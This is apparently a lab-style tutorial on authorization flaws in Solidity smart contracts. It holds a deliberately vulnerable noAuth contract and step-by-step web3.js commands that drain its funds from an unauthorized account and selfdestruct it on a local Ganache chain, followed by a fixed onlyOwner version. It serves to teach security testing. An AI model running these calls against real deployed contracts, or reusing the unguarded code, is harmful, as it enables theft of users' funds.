# 🚂 Authorization Issues

## No Authorization

{% code lineNumbers="true" %}
```solidity
pragma solidity ^0.6.6;

contract noAuth {

    mapping (address =>uint) balances;

    function deposit() public payable{
 	    balances[msg.sender] = balances[msg.sender]+msg.value;	
    }
    
    function withdraw(uint amount) public payable {
      msg.sender.transfer(amount);
    }
    
    function kill() public {
        selfdestruct(msg.sender);
    }
}
```
{% endcode %}

The noAuth contract above is setup like a mini bank account, where you have the ability to deposit your funds and withdraw your funds. The funds are mapped to your msg.sender address on line 5.  However, there are a few flaws with the way this contract is setup, both in authorization as well as business logic.&#x20;

Let’s go through the code and look about how it is setup.  First, we have a deposit function on line 7 which accepts a value transfer via the “payable” keyword and applies the value to your current balance associated with your address.  This function seems ok.

Next, we have a withdraw function which receives an amount and transfers that amount to the address which calls the function. But.

> &#x20; The withdraw function never actually checks if you have a balance associated with your address
>
> &#x20; It also doesn’t validate if you have enough in your balance to send the amount you’re asking for.

&#x20;

**That poses a few interesting questions:**

1. Where is this function withdrawing funds from if you don’t have a balance associated with your address?
2. Can you simply liquidate the funds from the account as a whole?



**Is this a potential business logic / authorization issue?**

Finally, we have a kill function on line 15, which simply calls the built-in solidity self-destruct function and transfers all of the contract’s funds to the caller of the function. This function will terminate the contracts functionality permanently and liquidate the contracts funds into the account address which ran the kill function. Much like the other two functions the kill function has no authorization, poses a risk to everyone’s funds, and leaves the whole contract vulnerable to termination.

Let’s play around with this functionality and determine if this is true within the Remix UI.

**Action Steps:**

> **1.**  Deposit 10 Ether via the deposit function with the value field using account one.
>
> **2.** Switch accounts to account two which has no funds and try to withdraw funds. Did it work?
>
> **3.**  Now call the kill function from account two. What happened?
>
> **4.**  Try to withdraw funds again with either account. What happened?





## Attacking Authorization with Web3.js

### Enumerating Functions (ABI File)

we have a few options available to us when trying to enumerate public functionality so we can make direct calls.  The most useful resources for enumerating these issues is both the sour\
ce code and the Application Binary Interface (ABI).

First, we can take a look at the source code, if you are performing the penetration test the client should provide the source code. If the client does not provide the source code, most Ethereum projects tend to be open source, so you should find a GitHub with the source code. A third option for retrieving the source code would be pulling it from etherscan.io at the address where the contract is deployed. This should be located under the contract tab.

Another option if you were provided a contract from the client is to deploy a contract to Remix and grab the ABI that is created. You can grab this in Remix under the compiler section under compiler details. Just click the ABI text and it will copy it to your clipboard.

An ABI file for our noAuth contract will look something like the following Snippet.

```json
[
	{
		"inputs": [],
		"name": "deposit",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "kill",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "withdraw",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	}
]
```

### Calling Public Functions with Web3.js

{% hint style="info" %}
sudo npm install -g ganache-cli
{% endhint %}

```
1.       Open up your browser, and in Remix and create the noAuth.sol file

2.       Start Ganache-Cli on in your terminal (Run ganache-cli)

3.       Set the provider in Remix Deploy section to Custom - External HTTP Provider

4.       Deploy the noAuth.sol contract, which will now deploy to your local ganache blockchain

5.       Copy the address for noAuth.sol. You will need it.

6.       Copy the address of the second account

7.       Deposit 10 Ether via the Deposit function and the Value field (don’t forget to change the value type to Ether from Wei)
```



Now open up a terminal and install web3 followed by opening a node terminal:

```
$ npm install web3

$ node
```

Once node is running you will see a blank line with a > meaning you are in the node interactive console. We will now setup a direct connection and attack both the withdraw and kill functions to liquidate the contracts funds and terminate its functionality. The first thing we will need to do is setup our web3 import using the localhost target where our ganache-cli is running our blockchain transactions. Note with the commands below the output will usually say “undefined”, you can ignore this output.

```
> const Web3 = require('web3')

> const URL = "http://localhost:8545"

> const web3 = new Web3(URL)
```

These lines of input simply create an instance of web3 and set its target network URL. If this were a bug bounty or pentest on another network you would supply that target URL for the target network, we can do this with Infura URL’s to the test nets and mainnet on ethereum. We cover how to do this in other labs, but for this lab we are using our local targets.

&#x20;

Next lets setup our accounts so that we are using the 2nd account we selected in our remix account dropdown which was imported from ganache-cli. Note accounts start with 0 so the second account is actually labeled as account 1. And also note we deployed our contract with account 0.

```
> accounts = web3.eth.getAccounts();

> var account;

> accounts.then((v) => {(this.account = v[1])})
```



We setup our account in web3 simply by grabbing all of the accounts and then setting the value of account (singular) to 1 with the commands above. Syntax in node / JavaScript is a bit cryptic at times so the commands may look a bit odd but you can easily look them up in the web3 documentation.&#x20;

&#x20;

Now we need to setup our target contract address from the proxy contract. We also need to paste in the full ABI and then connect the address and the ABI with a contract variable to reference in our calls to the contract. We can do that with the input below.

```
> const address = "ADD CONTRACT ADDRESS HERE"

> const abi = ADD ABI HERE

> const contract = new web3.eth.Contract(abi, address)
```



Now we are ready to make a call to the contract with the contract connection variable we just created. We will first withdraw funds to our second account which never deposited any funds. We do this using the command below that calls the withdraw function using our account variable. We also specify sending a default gas value since we need to send gas with transactions that make changes on the blockchain.

Before using the command below, first note your account balance in remix on your second account. This should be 100 ether at this point as it was not used in any transactions and it also holds no balance to withdraw in the contract.  Then send the following command which requests 1 ether in Wei. Wei is denominated as the following 1 Ether = 1,000,000,000,000,000,000 Wei (10^18)

```
> contract.methods.withdraw("1000000000000000000").send({gas: 3000000,from: account})
```

After a few moments you should see your balance increase in the second account on Remix. Now let’s kill the contract so no one else can use it which will additionally send the remaining ether in the contract to our address per the msg.sender value in the source code call to self-destruct.

```
> contract.methods.kill().send({gas: 3000000,from: account})
```



## Simple Authorization

The below code is a simple fix of the above authorization issue that we had.

```solidity
pragma solidity ^0.6.6;

contract SimpleAuth {

    address owner;
    mapping (address =>uint) balances;

    constructor() public{
        owner = msg.sender;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    function deposit() public payable{
 	    balances[msg.sender] = balances[msg.sender]+msg.value;	
    }
    
    function withdraw(uint amount) public payable {
      require(balances[msg.sender]>=amount);
      msg.sender.transfer(amount);
    }
    
    function kill() public onlyOwner {
        // require(msg.sender == owner);
        selfdestruct(msg.sender);
    }
}
```





## REFERENCES

* [https://console-cowboys.blogspot.com/2020/09/smart-contract-hacking-chapter-5.html](https://console-cowboys.blogspot.com/2020/09/smart-contract-hacking-chapter-5.html)
* [https://github.com/cclabsInc/BlockChainExploitation/tree/master/2020\_BlockchainFreeCourse/authorization](https://github.com/cclabsInc/BlockChainExploitation/tree/master/2020\_BlockchainFreeCourse/authorization)
* [https://docs.openzeppelin.com/contracts/3.x/access-control](https://docs.openzeppelin.com/contracts/3.x/access-control)
* [https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/access](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/access)



